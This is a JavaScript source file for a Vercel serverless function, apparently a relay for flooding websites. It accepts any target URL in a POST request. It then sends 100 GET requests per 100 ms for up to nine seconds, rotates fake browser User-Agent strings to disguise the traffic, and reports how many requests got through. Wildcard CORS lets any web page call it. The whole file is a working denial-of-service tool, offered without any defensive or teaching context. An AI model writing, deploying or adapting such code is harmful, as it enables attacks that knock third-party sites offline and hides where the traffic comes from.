// api/ninja.js — Vercel Node.js Serverless Function
// Ported from ninja.js. Fires 100 requests per 100 ms tick.

const UA = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
];
const pickUA = () => UA[Math.floor(Math.random() * UA.length)];

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
};

async function runTick(target) {
  const promises = [];
  for (let i = 0; i < 100; i++) {
    promises.push(
      fetch(target, { method: 'GET', headers: { 'User-Agent': pickUA() } })
        .then(r => (r.status >= 200 && r.status < 500))
        .catch(() => false)
    );
  }
  const results = await Promise.allSettled(promises);
  let ok = 0;
  for (const r of results) if (r.status === 'fulfilled' && r.value) ok++;
  return ok;
}

module.exports = async (req, res) => {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();

  if (req.method === 'GET') {
    return res.status(200).json({ ok: true, relay: 'ninja', ts: Date.now() });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, msg: 'POST only' });
  }

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch (e) { body = {}; }
  }
  if (!body || typeof body !== 'object') body = {};

  const target   = String(body.target || '').trim();
  const duration = Math.min(Math.max(parseInt(body.duration, 10) || 5, 1), 9);

  if (!/^https?:\/\//i.test(target)) {
    return res.status(400).json({ ok: false, msg: 'bad target' });
  }

  const start = Date.now();
  const deadline = start + duration * 1000;
  let total = 0;
  let ticks = 0;

  while (Date.now() < deadline) {
    const ok = await runTick(target);
    total += ok;
    ticks++;
    await new Promise(r => setTimeout(r, 100));
  }

  const elapsed = ((Date.now() - start) / 1000).toFixed(2);

  return res.status(200).json({
    ok: true,
    target,
    duration,
    sent: total,
    ticks,
    elapsed,
    rate: (total / (elapsed || 1)).toFixed(1),
  });
};
